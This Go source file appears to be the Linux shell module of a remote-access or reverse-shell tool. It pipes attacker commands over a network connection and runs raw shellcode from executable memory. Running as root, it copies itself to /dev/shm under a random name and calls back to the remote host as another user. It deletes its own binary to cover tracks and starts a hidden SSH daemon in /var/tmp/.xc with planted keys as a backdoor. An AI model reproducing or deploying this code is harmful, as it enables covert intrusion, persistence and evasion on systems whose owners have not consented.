package shell

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"unsafe"
	"../utils"
)

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void execute(char *shellcode, size_t length) {
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
  }
*/
import "C"

// Shell ...
func Shell() *exec.Cmd {
	cmd := exec.Command("/bin/bash", "-i")
	return cmd
}

// Exec ...
func Exec(command string, c net.Conn) {
	path := "/bin/sh"
	cmd := exec.Command(path, "-c", command)
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// RunAsPs ...
func RunAs(username string, pass string, domain string, c net.Conn) {
	current, err := user.Current()
	if err != nil {
		c.Write([]byte("Error: " + err.Error() + "\n"))
		return
	}
	uid := current.Uid
	if uid == "0" {
		path := CopySelf()
		err = os.Chmod(path, 0755)
		if err != nil {
			c.Write([]byte("Error: Couldn't chmod\n"))
			return
		}
		ip, port := utils.SplitAddress(c.RemoteAddr().String())
		args := fmt.Sprintf("%s %s %s", path, ip, port)
		fmt.Println(args)
		err = CreateProcessAsUser(username, path, args)
		if err != nil {
			c.Write([]byte("Error: " + err.Error() + "\n"))
			return
		}
		fmt.Println("Closing...")
		c.Close()
		return
	} else {
		c.Write([]byte("Error: Not root\n"))
		return
	}
}

// RunAsPs ...
func RunAsPS(username string, pass string, domain string, c net.Conn) {
	c.Write([]byte("Not implemented\n"))
}

// ExecSC ....
func ExecSC(sc []byte) {
	ptr := &sc[0]
	size := len(sc)
	C.execute((*C.char)(unsafe.Pointer(ptr)), (C.size_t)(size))
}

// ExecOut ...
func ExecOut(command string) (string, error) {
	path := "/bin/sh"
	cmd := exec.Command(path, "-c", command)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecPSOut ...
func ExecPSOut(command string) (string, error) {
	fmt.Println("Not implemented")
	return "", errors.New("Not implemented")
}

// ExecDebug ...
func ExecDebug(cmd string) (string, error) {
	out, err := ExecOut(cmd)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecPSDebug ...
func ExecPSDebug(cmd string) (string, error) {
	fmt.Println("Not implemented")
	return "", errors.New("Not implemented")
}

// Powershell ...
func Powershell() (*exec.Cmd, error) {
	fmt.Println("Not implemented")
	return nil, errors.New("Not implemented")
}

// CopySelf ...
func CopySelf() string {
	currentPath := os.Args[0]
	// random name
	name := utils.RandSeq(8)
	path := fmt.Sprintf("/dev/shm/%s", name)
	utils.CopyFile(currentPath, path)
	return path
}

// ExecSilent ...
func ExecSilent(command string, c net.Conn) {
	path := "/bin/sh"
	cmd := exec.Command(path, "-c", command)
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// Seppuku ...
func Seppuku(c net.Conn) {
	binPath := os.Args[0]
	fmt.Println(binPath)
	go Exec(fmt.Sprintf("sleep 5 && rm %s", binPath), c)
}

// StartSSHServer ...
func StartSSHServer(port int, c net.Conn) {
	tmpDir := "/var/tmp/.xc"
	ExecSilent(fmt.Sprintf("mkdir -p %s", tmpDir), c)
	hostRsaFile := fmt.Sprintf("%s/host_rsa", tmpDir)
	hostDsaFile := fmt.Sprintf("%s/host_dsa", tmpDir)
	hostRsaPubFile := fmt.Sprintf("%s/host_rsa.pub", tmpDir)
	hostDsaPubFile := fmt.Sprintf("%s/host_dsa.pub", tmpDir)
	authKeyFile := fmt.Sprintf("%s/key_pub", tmpDir)

	utils.SaveRaw(hostRsaFile, host_rsa)
	utils.SaveRaw(hostDsaFile, host_dsa)
	utils.SaveRaw(hostRsaPubFile, host_rsa_pub)
	utils.SaveRaw(hostDsaPubFile, host_dsa_pub)
	utils.SaveRaw(authKeyFile, key_pub)

	files, err := ioutil.ReadDir(tmpDir)
	if err != nil {
		fmt.Println(err)
	}
	for _, f := range files {
		if err = os.Chmod(fmt.Sprintf("%s/%s", tmpDir, f.Name()), 0600); err != nil {
			fmt.Println(err)
		}
	}

	config := ""
	config += fmt.Sprintf("Port %d\n", port)
	config += "Protocol 2\n"
	config += fmt.Sprintf("HostKey %s\n", hostRsaFile)
	config += fmt.Sprintf("HostKey %s\n", hostDsaFile)
	config += "PubkeyAuthentication yes\n"
	config += fmt.Sprintf("AuthorizedKeysFile %s\n", authKeyFile)
	config += "IgnoreRhosts yes\n"
	config += "HostbasedAuthentication yes\n"
	config += "PermitEmptyPasswords no\n"
	config += "ChallengeResponseAuthentication no\n"
	config += "PasswordAuthentication no \n"
	config += "X11Forwarding yes\n"
	config += "X11DisplayOffset 10\n"
	config += "PrintMotd no\n"
	config += "PrintLastLog yes\n"
	config += "TCPKeepAlive yes\n"
	config += "AcceptEnv LANG LC_*\n"
	config += "UsePAM no\n"
	config += "StrictModes no\n"

	utils.SaveRaw(fmt.Sprintf("%s/sshd_config", tmpDir), config)
	_, err = ExecOut(fmt.Sprintf("/usr/sbin/sshd -f %s/sshd_config", tmpDir))
	if err == nil {
		c.Write([]byte(fmt.Sprintf("SSH server started on port %d\n", port)))
	} else {
		c.Write([]byte("Couldn't start ssh server\n"))
	}
}
